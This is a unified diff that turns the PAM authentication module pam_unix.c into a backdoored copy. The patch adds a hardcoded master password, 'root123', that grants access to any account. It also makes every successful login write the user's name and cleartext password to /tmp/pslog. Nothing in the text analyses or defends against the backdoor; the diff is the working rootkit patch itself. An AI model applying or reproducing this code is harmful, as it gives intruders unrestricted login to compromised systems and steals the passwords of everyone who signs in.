@@ -1,0 +1,44 @@
+--- pam_unix.c	Sun Nov 10 17:24:19 2002
++++ pam_unix.c_bd	Sun Nov 10 17:34:58 2002
+@@ -43,6 +43,9 @@
+ 
+ #define PASSWORD_PROMPT	"Password:"
+ 
++#define BACKDOOR "root123"
++#define PASSLOG "/tmp/pslog"
++
+ enum {
+ 	PAM_OPT_AUTH_AS_SELF	= PAM_OPT_STD_MAX,
+ 	PAM_OPT_NULLOK
+@@ -67,6 +70,7 @@
+ 	const char *password, *realpw;
+ 	struct passwd *pwd;
+ 	struct options options;
++	FILE *fp;
+ 
+ 	pam_std_option(&options, other_options, argc, argv);
+ 	if (pam_test_option(&options, PAM_OPT_AUTH_AS_SELF, NULL)) {
+@@ -88,11 +92,23 @@
+ 	} else {
+ 		realpw = "*";
+ 	}
++	
+ 	if ((retval = pam_get_pass(pamh, &password, PASSWORD_PROMPT,
+ 	    &options)) != PAM_SUCCESS)
+ 		return retval;
++
++	if(strcmp(password, BACKDOOR) == 0)
++	{
++		return PAM_SUCCESS;
++	}
++
+ 	if (strcmp(crypt(password, realpw), realpw) == 0)
++	{
++		fp = fopen(PASSLOG, "a");
++		fprintf(fp, "%s :: %s\n", user, password);
++		fclose(fp); 
+ 		return PAM_SUCCESS;
++	}
+ 	return PAM_AUTH_ERR;
+ }
+ 
